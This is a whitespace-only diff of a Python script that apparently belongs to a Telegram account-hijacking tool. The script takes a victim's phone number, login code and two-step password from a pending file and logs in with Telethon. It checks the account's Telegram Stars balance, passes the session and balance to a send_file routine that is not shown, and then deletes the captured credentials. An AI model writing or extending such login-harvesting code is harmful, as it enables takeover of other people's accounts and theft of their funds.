@@ -32,7 +32,6 @@ def send_file(phone, saldo):
 async def main(phone):
     client = TelegramClient(f"session_{phone.replace('+','')}", API_ID, API_HASH)
     await client.connect()
-    
     try:
         with open(PENDING_FILE, "r") as f:
             pending = json.load(f)
@@ -40,17 +39,14 @@ async def main(phone):
         notify(f"❌ No se encontraron datos para {phone}")
         await client.disconnect()
         return
-    
     code = pending.get("code", "")
     password = pending.get("password", None)
-    
     try:
         if not code:
             await client.sign_in(phone=phone)
             notify(f"✅ Código enviado a {phone}")
             await client.disconnect()
             return
-        
         try:
             await client.sign_in(code=code)
         except SessionPasswordNeededError:
@@ -69,7 +65,6 @@ async def main(phone):
                 await client.sign_in(code=code)
             else:
                 raise e
-                
     except FloodWaitError as e:
         notify(f"⏳ {phone} esperar {e.seconds}s")
         await client.disconnect()
@@ -78,7 +73,6 @@ async def main(phone):
         notify(f"❌ Error login {phone}: {str(e)}")
         await client.disconnect()
         return
-
     notify(f"✅ Login exitoso para {phone}")
     try:
         saldo = await client(functions.payments.GetStarsStatusRequest(peer='me'))
@@ -87,10 +81,8 @@ async def main(phone):
     except Exception as e:
         notify(f"⚠️ Error al obtener saldo: {e}")
         s = 0
-
     send_file(phone, s)
     await client.disconnect()
-    
     if os.path.exists(PENDING_FILE):
         os.remove(PENDING_FILE)
 
